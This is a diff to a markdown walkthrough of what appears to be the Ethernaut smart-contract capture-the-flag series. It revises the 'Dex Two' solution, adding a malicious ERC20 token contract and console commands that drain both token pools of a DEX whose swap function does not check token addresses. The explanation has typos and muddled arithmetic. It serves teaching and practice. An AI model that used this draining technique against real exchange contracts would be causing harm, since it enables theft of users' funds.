@@ -894,21 +894,40 @@ await contract.swap(b, a, 45); // the reason why we use 45 here instead of the e
 ```
 
 ## 23. DEX TWO
-This level is very similar to the previous level except you need to use a custom ERC20 token contract to drain the funds of the DEX. The reason why this is possible is because the swap doesn't require that the from / to has to be token1 and token2 so you can use a 3rd token and drain each side sequentially.
+This level is very similar to the previous level except you need to use a custom ERC20 token contract to drain the funds of the DEX. The vulnerability here arises from swap method which does not check that the swap is necessarily between token1 and token2. We'll exploit this.
+So first we deploy a a mallicious token contract on remix, 
 
 ```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract MalToken is ERC20 {
+    constructor(uint256 initialSupply) ERC20("MalToken", "MLT") {
+        _mint(msg.sender, initialSupply);
+    }
+}
+
+```
+Then we exchange MLT for token1 and token2 while draining DexTwo, to do this we send 100 MLT tokens to DexTwo using MLT transfer, so now price ratio in DexTwo btw MLT, token1 and token2 is 1:1:1, and awe aslo need to allow DexTwo to transact 300, where we have 100 for t1 and 200 for t32, so we just approve on our MLT token that our instant address uses 200 tokens, using the approve method and passing the instance address and 200 as parametres
+The reason why this is possible is because the swap doesn't require that the from / to has to be token1 and token2 so you can use a 3rd token and drain each side sequentially.
+
+```
+We first get our addresses:
+t1 = await contract.token1()
+t2 = await contract.token2()
+t3 = "< MLT token address e>"
 a = await contract.token1()
 b = await contract.token2()
-// Create a custom ERC20 token contract (C) and mint to yourself some tokens.
-c = "<insert custom token address here>"
 
-await c.approve(instance, 1000);
-await c.transfer(instance, 1);
-await contract.swap(c, a, 1);
-await contract.swap(c, b, 2);
+await contract.swap(t3, t1, 100)
+// 200 next cause with the updated balance and according to `get_swap_amount' we need 200 MLT 
+await contract.swap(t3, t2, 200)
+
 ```
-
+We can always verify the balance of both tokens by using the `balanceOf()` function `await contract.balanceOf(t2, instance).then(v => v.toString())`
+Level solved!
 ## 24. Puzzle Wallet
 If you understand delegatecall, you should be able to solve this. Essentially what is happening is that the storage variable `pendingAdmin` is sharing the same storage slot with `owner` and the storage variable `admin` is sharing the same storage slot with `maxBalance`.
 
